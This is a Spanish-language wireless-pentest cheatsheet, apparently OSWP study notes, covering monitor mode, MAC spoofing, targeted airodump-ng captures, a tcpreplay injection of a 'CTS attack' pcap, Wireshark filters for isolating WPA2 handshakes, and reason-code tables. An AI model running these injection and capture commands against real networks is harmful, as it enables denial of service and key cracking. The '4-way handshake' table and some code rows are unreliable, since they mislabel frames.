| [█ █ █   << BACK TO TOP >>   █ █ █](https://github.com/Fz3r0/Fz3r0_-_BlackShark/blob/main/OSWP/Hacia_el_infierno_del_OSWP.md#%EF%B8%8F-%C3%ADndice)                |<br>
└═════════════════════┘<br>

 </div> 

<br><br><br>

---

## 💀 `Fz3r0 Cheatsheet`: Channel Selection

- Basics

````sh
# Opción 1: iwconfig
iwconfig wlan0mon channel 6

# Opción 2: iwconfig (auto)
iwconfig eth0 channel auto

# Opción 3: iw
iw dev wlan0mon set channel 6
````

- Channel Selection: `x1 Adapter`

````sh
# Cambiar Canales a 3 Adaptadores (Necesario que estén en Monitor): Channels: 1,6,11 [Incluye MAC Spoofing por 01,02,03]
iwconfig wlan0mon channel 1 && iwconfig wlan1mon channel 6 && iwconfig wlan2mon channel 11 && clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m[*] MULTIPLE WIRELESS CHANNEL MONITOR & CAPTURE\033[0m";echo -e "\033[97m[*] TRIPLE WLAN ADAPTER START - [CHANNEL 1 | CHANNEL 6 | CHANNEL 11] - @ 2.4 GHz\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m" && echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m";echo "";iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev
````

- Channel Selection: `x3 Adaptes` - Channels: `1`,`6`,`11`

````sh
# Cambiar Canales a 3 Adaptadores (Necesario que estén en Monitor): Todos Channel 6 [Incluye MAC Spoofing por 01,02,03]
iwconfig wlan0mon channel 6 && iwconfig wlan1mon channel 6 && iwconfig wlan2mon channel 6 && clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "";echo -e "\033[97m[*] MULTIPLE WIRELESS CHANNEL MONITOR & CAPTURE\033[0m";echo -e "\033[97m[*] TRIPLE WLAN ADAPTER START - [CHANNEL 6 + CHANNEL 6 + CHANNEL 6] - @ 2.4 GHz\033[0m";echo "";echo -e "\033[97m--- SYSTEM:\033[0m";echo "";echo -e "\033[32m$(uname -a)\033[0m" && echo "";echo -e "\033[97m--- WIRELESS ADAPTERS & MODE:\033[0m";echo "";iwconfig 2>/dev/null | grep -vE 'eth|lo' | grep -v 'no wireless extensions';iw dev
````

## 💀 `Fz3r0 Cheatsheet`: Band & Frequency Selection


````sh
# Opción 1: iwconfig
iwconfig wlan0mon channel 6

# Opción 2: iwconfig (auto)
iwconfig eth0 channel auto

# Opción 3: iw
iw dev wlan0mon set channel 6
````


---

###

````sh

iwconfig eth0 freq 2422000000
iwconfig eth0 freq 2.422G
iwconfig eth0 channel 3
iwconfig eth0 channel auto
````


### MAC Spoofing: `3 Adapters`

````sh
# MAC Spoofing Triple Adapter (Necesario que estén en Monitor)
ifconfig wlan0mon down; ifconfig wlan1mon down; ifconfig wlan2mon down && macchanger --mac=f0:f0:f0:00:00:00 wlan0mon && macchanger --mac=f0:f0:f0:00:00:01 wlan1mon && macchanger --mac=f0:f0:f0:00:00:02 wlan2mon && ifconfig wlan0mon up; ifconfig wlan1mon up; ifconfig wlan2mon up
````

---

### Tc Power & Gain

````sh
txpower
              For cards supporting multiple transmit powers, sets the transmit power in dBm. If W is the power in Watt, the power in dBm is
              P = 30 + 10.log(W).  If the value is postfixed by mW, it will be automatically converted to dBm.
              In addition, on and off enable and disable the radio, and auto and fixed enable and disable power control (if those  features
              are available).
              Examples :
                   iwconfig eth0 txpower 15
                   iwconfig eth0 txpower 30mW
                   iwconfig eth0 txpower auto
                   iwconfig eth0 txpower off
````

---

### Full lists & Bibles

````sh
iw list

iw list god


lsusb -D /dev/bus/usb/002/002

# Script para decirme tal cual si está activo el modo monitor (Solo un Adaptador)
clear;echo -e "\033[31m[+] Fz3r0 💀 Wireless IEEE 802.11 (WiFi) Adapter Validator v1.0\033[0m";echo -e "\033[31m[+] Twitter: @Fz3r0_OPs | Github: Fz3r0\033[0m";echo "" && echo -e "\033[97m--- USB ADAPTERS & DRIVERS:\033[0m\n"; if iwconfig 2>/dev/null | grep -q 'Mode:Monitor'; then printf "\033[32mWLAN Interface Status:%20s\nDriver Manufacturer:%22s\nMonitor Mode:%28s\033[0m\n" "Present" "$(lsusb -D /dev/bus/usb/002/002 2>/dev/null | grep "iManufacturer" | awk '{print $3}')" "Active"; elif iwconfig 2>/dev/null | grep -q 'no wireless'; then echo -e "\033[31mWLAN Interface Status:%20s\n%s\033[0m" "Not Present" "No WLAN interface detected"; else echo -e "\033[31mWLAN Interface Status:%20s\nMonitor Mode:%28s\033[0m" "Present" "Inactive"; fi;
````

### Roots Bloody Roots

````sh
iw list
lsusb -D /dev/bus/usb/002/002
lsusb | grep -E "^Bus (00[2-9]|[1-9][0-9]*)"
lsusb -D /dev/bus/usb/002/002 2>/dev/null | grep "iManufacturer" | awk '{print "Vendor:........ "$3}'
````

## Data Rate

````
                   iwconfig eth0 rate 11M
                   iwconfig eth0 rate auto
                   iwconfig eth0 rate 5.5M auto
````


## Standalone Commands

### Verification Commands

````sh
# Verificar el Kernel, versión, de Linux
uname -a

# Revisar configuración de Interfaces
ifconfig

# Revisar configuración de Interfaz Wireless
iwconfig

# Revisar drivers e información de Interfaz usb (pe. Alfa, TP-Link, Panda)
lsusb

# Revisar especificaciones detalladas de la Ineterfaz usb (002 002 se saca primero con lsusb)
lsusb -D /dev/bus/usb/002/002

# Verificar si la antena inyecta paquetes
aireplay-ng --test wlan0mon

# Verificar banda/canal utilizado y utilizables
iwlist channel

# Verificar lista larga con toda la info
iw list

# verificar USBs
usb-devices

# Muestra los Adaptadores Wireless Conectados y su estado
iw dev

# Verifica adaptador
airmon-ng 

# info de adaptador
iw phy0 info

iw list

lspci -k

lspci 

iw phy0 info

````

---

### Cambiar de Canal o Banda

````sh
# Cambiar canal (ej, 2.4ghz ch 11)
iwconfig wlan0mon channel 11

# Cambiar de banda (2.4 GHz)
iwconfig wlan0mon freq 2.4G

# Cambiar de banda (5 GHz)
iwconfig wlan0 freq 5G

# Cambiar de banda (6 GHz)
iwconfig wlan0 freq 6G
````

---

### MAC Spoofing

````sh
# Busar Lista de OUI de MACs por nombre (ej. Ruckus)
macchanger -l | grep "Ruckus"

# Hacer MAC Spoofing (cambiar MAC). OJO! Apagar Interfaz primero
ifconfig wlan0mon down
macchanger --mac=c4:10:8a:f0:f0:f0 wlan0mon
ifconfig wlan0mon up

# MAC Changer triple interface
ifconfig wlan0mon down; ifconfig wlan1mon down; ifconfig wlan2mon down
macchanger --mac=f0:f0:f0:00:00:00 wlan0mon && macchanger --mac=f0:f0:f0:00:00:01 wlan1mon && macchanger --mac=f0:f0:f0:00:00:02 wlan2mon
ifconfig wlan0mon up; ifconfig wlan1mon up; ifconfig wlan2mon up

# One-Liner: MAC Changer triple interface
ifconfig wlan0mon down; ifconfig wlan1mon down; ifconfig wlan2mon down && macchanger --mac=f0:f0:f0:00:00:00 wlan0mon && macchanger --mac=f0:f0:f0:00:00:01 wlan1mon && macchanger --mac=f0:f0:f0:00:00:02 wlan2mon && ifconfig wlan0mon up; ifconfig wlan1mon up; ifconfig wlan2mon up; 

````

---

### Frame Inyection

- Esto sirve tanto para 802.3 Ethernet como 802.11 Wireless, depende la interface

````sh
# - intf1     = Interface
# - topspeed  = Máximo posible de interface
# - loop      = Cantidad de Frames
# - .pcap     = El frame a enviar

tcpreplay --intf1=wlan0mon --topspeed --loop=2000 Fz3r0_CTS_808_30000duration_attack.pcap 2>/dev/null
````


---

### Monitor, Aditoría, Captura de WiFi & Apagar/Reiniciar todo

`````sh
   #
   #  ONE LINER (MONITOR)
   #

# Nota: el primero es wlan0 (porque aún no está en monitor), el segundo ya es wlan0mon (porque ya está modo monitor)
airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0mon -c 6

# Nota2: Después ya se puede usar solo wlan0mon ya que estará activado durante la sesión
airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng wlan0mon -c 6
   #
   #  ONE LINER FULL (MONITOR + SAVE AUDIT .cap)
   #

# Opción BSSID
airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng wlan0mon -c 6 --bssid 30:45:96:D7:F2:3E --write Fz3r0_WiFi_Log

# Opción ESSID
airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng wlan0mon -c 6 --essid Fz3r0_Air_PWN --write Fz3r0_WiFi_Log

   #
   #  MODO MONITOR CON IWCONFIG
   #

iwconfig wlan0 mode monitor   

   #
   #  ONE LINER (AUDIT SIN GUARDAR)
   #

# Opción BSSID
airodump-ng -c 6 --bssid 30:45:96:D7:F2:3E

# Opción ESSID
airodump-ng -c 6 --essid Fz3r0_Air_PWN wlan0

   #
   #  ONE LINER (AUDIT GUARDANDO Y VISUALIZANDO FILE)
   #

airodump-ng -c 1 --essid Fz3r0_Air_PWN wlan0 -w captura_wifi_fz3r0-01.cap 

watch -n 1 du -hc captura_wifi_fz3r0-01.cap # <<<--- Opcional para ver en tiempo real la captura guardada

   #
   #  ONE LINER (APAGAR Y REINICIAR INTERFAZ)
   #

# Nota: Este es un reinicio completo de interfaz, así que vuelve el nombre de wlan0mon a > wlan0
airmon-ng stop wlan0mon && /etc/init.d/networking restart


# Triple Restart
airmon-ng stop wlan0mon;airmon-ng stop wlan1mon;airmon-ng stop wlan2mon && /etc/init.d/networking restart; iwconfig
`````

---

### Monitor, Aditoría, Captura de WiFi & Apagar/Reiniciar todo: FULL Version:

````sh
   #
   #  INICIAR INTERFAZ Y PONER EN MODO MONITOR
   #

# Detiene todos los procesos problemáticos
airmon-ng check kill

# Inicia la Interfaz "wlan0" en modo MONITOR
airmon-ng start wlan0

   #
   #  ANÁLISIS DE RED WIRELESS
   #

# Hace análisis de la red Wireless (en el canal que esté la interfaz)
airodump-ng wlan0mon 

# Hace análisis de la red Wireless de manera granular (-c [channel] | --essid [SSID de red WiFi])
airodump-ng -c 6 --essid Fz3r0_Air_PWN wlan0mon

   #
   #  ANÁLISIS DE RED WIRELESS + GUARDAR CAPTURA
   #

# Una opción solo es guardar la captura y la otra verla en tiempo real mientras se captura
# Para sòlo capturar solo ejecutar el primer comando, para observar ejecutar el segundo en otra consola (2 consolas en total)

# Consola1 
airodump-ng -c 1 --essid Fz3r0_Air_PWN wlan0 -w captura_wifi_fz3r0-01.cap
# Consola2
watch -n 1 du -hc captura_wifi_fz3r0-01.cap

   #
   #  APAGAR INTERFAZ Y/O FINALIZAR PROCESOS Y RESTABLECER INTERFAZ WIRELESS
   #

# Detener la Interfaz 'wlan'
airmon-ng stop wlan0

# Siempre hacer un restart al final que ya se haya parado (depende del Linux el comando):
# Opcion 1
service network-manager restart
# Opcion 2
/etc/init.d/networking restart

### NOTA: para borrar todos los archivos generados: rm * <<<---
````

---
















---

<!-- 

FIN DE CAPITULO :D

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

 -->

<p align="center"> <img src="https://user-images.githubusercontent.com/94720207/228101704-c07ced92-e331-446c-aa7e-5d00018e2429.gif" alt="Encapsula" height=110px/> </a> </p> 

<br>
<br>
<br>

# 👹 `CANTO II`: 4-Way-Handshake Process

El 4-way handshake en 802.11 es un proceso que se utiliza para establecer una conexión segura entre una estación (STA) y un punto de acceso (AP) en una red WiFi. El proceso consta de cuatro frames de control de gestión 802.11, que se utilizan para autenticar y asociar una estación con un punto de acceso, y para establecer una clave de cifrado compartida entre ellos. A continuación, se describe cada uno de los cuatro frames implicados en el proceso de 4-way handshake

- **Pasos del `4-Way-Handshake` con una `WLAN` con `WPA2`:**

| **Paso**  | **Frame**                     | **Descripción**                                                                                                                                                                                                                                                                                                                                                       |
|---------- |-----------------------------  |---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  |
| **0**     | **Beacon**                    | El AP envía un frame de beacon para anunciar su presencia y los servicios que ofrece. Este frame contiene el SSID de la red, la tasa de datos soportada y otros parámetros de configuración.                                                                                                                                                                          |
| **1**     | **Probe Request**             | La estación envía un frame de Probe Request para descubrir los AP disponibles en el área. Este frame contiene el SSID de la red que está buscando.                                                                                                                                                                                                                    |
| **2**     | **Probe Response**            | El AP envía un frame de Probe Response para responder a la solicitud de la estación. Este frame contiene información sobre la capacidad del AP, la tasa de datos soportada y otros parámetros de configuración.                                                                                                                                                       |
| **3**     | **Authentication Request**    | La estación solicita al AP que le autentique en la red. Este frame contiene la dirección MAC de la estación y del AP, así como un identificador de servicio de conjunto básico (BSSID) que identifica el SSID de la red WiFi.                                                                                                                                         |
| **4**     | **Authentication Response**   | El AP responde a la solicitud de autenticación de la estación. Si la estación es autenticada correctamente, el AP envía un código de estado de autenticación (Authentication Status Code) y pasa al siguiente paso del proceso, que es la asociación. Si la autenticación falla, el AP envía un código de estado de error y el proceso de autenticación se termina.   |
| **5**     | **Association Request**       | Una vez que la estación se ha autenticado con éxito, solicita al AP que se asocie con la red WiFi. Este frame contiene información sobre la capacidad de la estación, el tipo de seguridad que se utiliza en la red y la lista de servicios que la estación solicita del AP.                                                                                          |
| **6**     | **Association Response**      | El AP responde a la solicitud de asociación de la estación. Si la estación es asociada correctamente, el AP envía un código de estado de asociación (Association Status Code) y establece una clave de cifrado compartida con la estación. Si la asociación falla, el AP envía un código de estado de error y el proceso se termina.                                  |
| **7**     | **Disassociation**            | La estación o el AP pueden enviar un frame de disociación para indicar que la conexión se ha desconectado.                                                                                                                                                                                                                                                            |
| **8**     | **Deauthentication**          | Este frame se utiliza para desautenticar a una estación de la red. Puede ser enviado por el AP o por otra estación de la red para forzar a la estación a desconectarse. El frame contiene información sobre el motivo de la desautenticación.                                                                                                                         |

## 🦈👿 `Fz3r0` BlackShark Filter `4-way-handshake`

- **`Filtro:` Supreme Victory Perfect**

````sh
# Papu pro full 4-way-handsjake process
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 ||  wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol)
````

- **`Ejemplo:`**

---

### 🦈👿 `Fz3r0` BlackShark Filters `4-way-handshake` ALL

- **Full Handshake + Data + Actions + Retry + Probes + Beacons**

````py
wlan.fc.type_subtype == 4 || wlan.fc.type_subtype == 5 || wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 8 || wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol || wlan.fc.type_subtype == 32 || wlan.fc.type_subtype == 13
````

---

- **Full - Sin Data**

````py
wlan.fc.type_subtype == 4 || wlan.fc.type_subtype == 5 || wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 8 || wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol || wlan.fc.type_subtype == 13
````

---

- **Full - Sin Data & Sin Retry**

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 4 || wlan.fc.type_subtype == 5 || wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 8 || wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol || wlan.fc.type_subtype == 13)
````

---

- **Sin Beacon**

````py
wlan.fc.type_subtype == 4 || wlan.fc.type_subtype == 5 || wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol || wlan.fc.type_subtype == 32 || wlan.fc.type_subtype == 13
````

---

- **Sin Beacon & Sin Retry**

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 4 || wlan.fc.type_subtype == 5 || wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol || wlan.fc.type_subtype == 32 || wlan.fc.type_subtype == 13)
````

---

- **`KILLER!!!` Sin Beacon & Sin Data & Sin Retry**

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 4 || wlan.fc.type_subtype == 5 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol || wlan.fc.type_subtype == 13)
````

---

- **`ULTRA COMBO!!!`  Sin Probes - `IT'S DANGEROUS!!!`**

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol || wlan.fc.type_subtype == 13)
````

---

- **`ULTRA COMBO!!!`  Sin Probes PERO SI CON DATA (login fail and good data analyze) - `IT'S DANGEROUS!!!`**

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol || wlan.fc.type_subtype == 13 || wlan.fc.type_subtype == 32)
````

---

- **`SUPREME VICTORY PERFECT!!!` Sin Probes & Sin Actions - `IT'S DANGEROUS!!!`**

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 ||  wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol)
````

---

- **`SUPREME VICTORY!!!` con DHCP incluido - `IT'S DANGEROUS!!!`**

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 ||  wlan.fc.type_subtype == 11 || wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10 || eapol) or (dhcp || dhcpv6)
````

---

- **`KILLER!!!` Very Clean: Solo Authentication, Association, Action y 4-way-handshake**

---

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 11 || eapol || wlan.fc.type_subtype == 13)
````

---

- **`KILLER!!!` Very Clean: Solo Authentication, Association, Action y 4-way-handshake con Data**

---

````py
!wlan.fc.retry == 1 && (wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3 || wlan.fc.type_subtype == 11 || eapol || wlan.fc.type_subtype == 32 || wlan.fc.type_subtype == 13)
````

---

- **Solo 4-way-Handshake**

````py
!wlan.fc.retry == 1 && eapol
````

---

- **4-way-Handshake: Message 1**

````py
wlan_rsna_eapol.keydes.msgnr == 1
````

---

- **4-way-Handshake: Message 2**

````py
wlan_rsna_eapol.keydes.msgnr == 2
````

---

- **4-way-Handshake: Message 3**

````py
wlan_rsna_eapol.keydes.msgnr == 3
````

---

- **4-way-Handshake: Message 4**

````py
wlan_rsna_eapol.keydes.msgnr == 4
````


---

### ⭕ Probe Request

https://notasinalambricas.wordpress.com/tag/probe-request/

- Se pueden ver generados por el cliente al monitorear la red
- Sirven para que la STA solicite al AP autenticación
- El probe Request es sepondido por el AP con un Probe Response

````py
# Probe Request Wireshark filter
wlan.fc.type_subtype == 4
````

---

### ⭕ Probe Response

https://notasinalambricas.wordpress.com/tag/probe-response/

- La respuesta desde un AP a un Probe Request de una STA
- Este paquete de respuesta desde al AP hacia la STA, le dice a la STA "Si aquí estoy (AP)"
- Eso genera que la STA haga un Association Request, para así lograr asociarse a la WLAN. 

````py
# Probe Response Wireshark filter
wlan.fc.type_subtype == 5
````
---

### ⭕ Association Request

https://mrncciew.com/2014/10/28/802-11-mgmt-association-reqresponse/

- Enviado de la STA hacia el AP, una vez que la STA sabe que el AP está presente con el ESSID y más info solicitado (que obtine de un Beacon)

````py
# Association Request Wireshark filter
wlan.fc.type_subtype == 0
````

---

### ⭕ Association Response

https://mrncciew.com/2014/10/28/802-11-mgmt-association-reqresponse/

- El AP responde a la asosiación de la STA hacie el AP

````py
# Association Request Wireshark filter
wlan.fc.type_subtype == 1
````

---

### ⭕ Beacon

- El frame que envia constantemente un AP a manera de Broadcast para anunciar sus ESSIDs disponibles o incluso ocultas
- Este frame tiene todos los detalles necesarios para que una STA pueda autenticarse y enviar Association Request

````py
# Beacon Wireshark filter
wlan.fc.type_subtype == 8
````

---

### ⭕ Authentications

- Enviado 

````py
# Authentication Wireshark filter
wlan.fc.type_subtype == 11
````

---

### ⭕ De-Authentications

- [De-Authentication Attack Wikipedia](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack)
- Después de un frame de-authentication va aislado y genera un frame De-Association

````py
# De-Authentications Wireshark filter
wlan.fc.type_subtype == 12
````

---

### ⭕ DisAssosiations

- 

````py
# DisAssosiations Wireshark filter
wlan.fc.type_subtype == 10
````

---

### ❌ Deauthentication Code

| **Code**      | **Motivo en el Frame**                                                                | **Descripción y posibles causas**                                                                                                                             |
|-----------    |------------------------------------------------------------------------------------   |-------------------------------------------------------------------------------------------------------------------------------------------------------------  |
| **0**         | **Unspecified**                                                                       | No se especificó ninguna razón en particular para la desautenticación.                                                                                        |
| **1**         | **Unacceptable authentication**                                                       | La estación no pudo autenticarse correctamente en la red. Posibles causas: contraseña incorrecta, certificado inválido, etc.                                  |
| **2**         | **Deauthenticated because sending STA is leaving (or has left) IBSS or ESS**          | La estación que envió el frame de desautenticación se está desconectando o ya se desconectó de la red.                                                        |
| **3**         | **Disassociated due to inactivity**                                                   | La estación ha estado inactiva durante un período de tiempo y ha sido desconectada automáticamente.                                                           |
| **4**         | **Disassociated because AP is unable to handle all currently associated stations**    | El AP no puede manejar más estaciones asociadas en ese momento.                                                                                               |
| **5**         | **Class 2 frame received from nonauthenticated station**                              | La estación envió un frame de clase 2 antes de autenticarse correctamente.                                                                                    |
| **6**         | **Class 3 frame received from nonassociated station**                                 | La estación envió un frame de clase 3 antes de asociarse correctamente.                                                                                       |
| **7**         | **Disassociated because sending STA is leaving (or has left) BSS**                    | La estación que envió el frame de desconexión se está desconectando o ya se desconectó de la BSS.                                                             |
| **8**         | **STA requesting (re)association is not authenticated with responding STA**           | La estación que solicita (re)asociación no está autenticada con la estación que responde.                                                                     |
| **9**         | **Unacceptable power level**                                                          | La estación que envió el frame de desautenticación ha detectado que el nivel de potencia de la estación que se está desconectando es inaceptablemente bajo.   |
| **10**        | **Unacceptable supported channels**                                                   | La estación que envió el frame de desautenticación ha detectado que la estación que se está desconectando no admite los canales admitidos por el AP.          |
| **11**        | **BSS transition management request rejected**                                        | La estación que envió el frame de desautenticación ha rechazado una solicitud de gestión de transición de BSS.                                                |
| **12-13**     | **Reserved**                                                                          | Reservado para uso futuro.                                                                                                                                    |
| **14**        | **Invalid element**                                                                   | El frame de desautenticación contiene un elemento de información de atributo (IE) inválido.                                                                   |
| **15**        | **MIC failure**                                                                       | Se produjo un error en la verificación de la integridad del mensaje (MIC) en el frame de autenticación o asociación.                                          |
| **16**        | **4-way handshake timeout**                                                           | La estación no ha recibido una respuesta en el tiempo de espera establecido después de enviar el cuarto frame del handshake de cuatro vías.                   |
| **17**        | **Group key update timeout**                                                          | La estación no ha recibido una actualización de clave de grupo en el tiempo de espera establecido.                                                            |
| **18**        | **802.1X authentication failed**                                                      | La autenticación 802.1X ha fallado. Posibles causas: certificado inválido, servidor RADIUS no disponible, etc.                                                |
| **19**        | **Cipher suite rejected by AP**                                                       | El AP ha rechazado la suite de cifrado seleccionada por la estación.                                                                                          |
| **20**        | **TP-Link SAFE: client making too much association attempts**                         | La estación ha intentado asociarse con el AP demasiadas veces en un período                                                                                   |

---

### ❌ Dissasociation Code

- https://mrncciew.com/2014/10/11/802-11-mgmt-deauth-disassociation-frames/

| **Code**      | **Motivo**                                                                                                                            | **Descripción y posibles causas**                                                                                                                                                                             |
|-----------    |-----------------------------------------------------------------------------------------------------------------------------------    |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   |
| **0**         | **Unspecified**                                                                                                                       | No se especifica la razón de la desconexión.                                                                                                                                                                  |
| **1**         | **Previous authentication no longer valid**                                                                                           | El cliente ya no está autenticado con el punto de acceso. Esto puede deberse a que la sesión ha caducado o porque el cliente ha cambiado de punto de acceso.                                                  |
| **2**         | **Deauthenticated because sending station is leaving (or has left) IBSS or ESS**                                                      | La estación que envía ha abandonado la red inalámbrica. Esto puede deberse a que la estación se ha movido fuera del alcance del punto de acceso o ha apagado su adaptador inalámbrico.                        |
| **3**         | **Disassociated due to inactivity**                                                                                                   | La estación ha estado inactiva durante un período de tiempo determinado y ha sido desconectada automáticamente por el punto de acceso.                                                                        |
| **4**         | **Disassociated because AP is unable to handle all currently associated stations**                                                    | El punto de acceso ha alcanzado su capacidad máxima de clientes asociados y ha desconectado a la estación para permitir que otros clientes se conecten.                                                       |
| **5**         | **Class 2 frame received from nonauthenticated station**                                                                              | El punto de acceso ha recibido un marco de clase 2 de una estación que no está autenticada.                                                                                                                   |
| **6**         | **Class 3 frame received from nonassociated station**                                                                                 | El punto de acceso ha recibido un marco de clase 3 de una estación que no está asociada.                                                                                                                      |
| **7**         | **Disassociated because sending station is leaving (or has left) BSS**                                                                | La estación que envía ha abandonado el conjunto de servicios básicos (BSS). Esto puede deberse a que la estación se ha movido fuera del alcance del punto de acceso o ha apagado su adaptador inalámbrico.    |
| **8**         | **Station requesting (re)association is not authenticated with responding station**                                                   | La estación que solicita (re)asociación no está autenticada con el punto de acceso.                                                                                                                           |
| **9**         | **Disassociated because the information in the Power Capability element is unacceptable**                                             | El punto de acceso ha desconectado a la estación porque la capacidad de energía de la estación no cumple con los requisitos del punto de acceso.                                                              |
| **10**        | **Disassociated because the information in the Supported Channels element is unacceptable**                                           | El punto de acceso ha desconectado a la estación porque los canales admitidos por la estación no cumplen con los requisitos del punto de acceso.                                                              |
| **11**        | **BSS Transition Management Request**                                                                                                 | La estación ha solicitado una transición de BSS a otro BSS.                                                                                                                                                   |
| **12-13**     | **Invalid element, i.e., an element defined in this standard for which the content does not meet the specifications in Clause 9**     | El punto de acceso ha detectado un elemento inválido en el marco enviado por la estación.                                                                                                                     |
| **14**        | **Message integrity code (MIC) failure**                                                                                              | El punto de acceso ha detectado una falla en el código de integridad de mensaje (MIC) en el marco enviado por la estación. Esto podría deberse a un intento de ataque de tipo "man-in-the-middle".            |
| **15**        | **4-way handshake timeout**                                                                                                           | El proceso de autenticación y asociación ha                                                                                                                                                                   |




---

<!-- 

FIN DE CAPITULO :D

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
